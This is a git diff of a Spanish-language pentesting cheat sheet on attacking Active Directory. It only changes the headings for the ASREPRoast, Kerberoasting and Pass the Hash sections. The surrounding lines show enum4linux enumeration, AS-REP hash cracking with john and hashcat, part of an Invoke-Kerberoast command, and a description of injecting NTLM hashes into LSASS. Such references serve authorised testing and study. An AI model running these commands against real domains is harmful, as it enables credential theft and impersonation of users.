@@ -206,7 +206,7 @@ Ahora el proceso es muy similar para obtener las columnas y los datos de las col
 
 `enum4linux -a -u "user" -p "password" <DC IP>` # Enumeramos con enum4linux
 
-**ASREPRoast**
+## ASREPRoast
 
 *El ataque ASREPRoast busca usuarios sin el atributo requerido de autenticación previa de Kerberos (DONT_REQ_PREAUTH)*
 
@@ -219,7 +219,7 @@ john --wordlist=rockyou.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
 `
 
-**Kerberoasting**
+## Kerberoasting
 
 *El objetivo de Kerberoasting es recopilar tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario en AD, no cuentas de computadora*
 
@@ -235,7 +235,7 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 `
 
 
-**PASS THE HASH**
+## PASS THE HASH
 
 *Una vez que tenga el hash de la víctima , puede usarlo para hacerse pasar por ella. Debe usar una herramienta que realice la autenticación NTLM usando ese hash , o puede crear un nuevo inicio de sesión e inyectar ese hash dentro del LSASS , de modo que cuando se realice cualquier autenticación NTLM , se usará ese hash.*
 
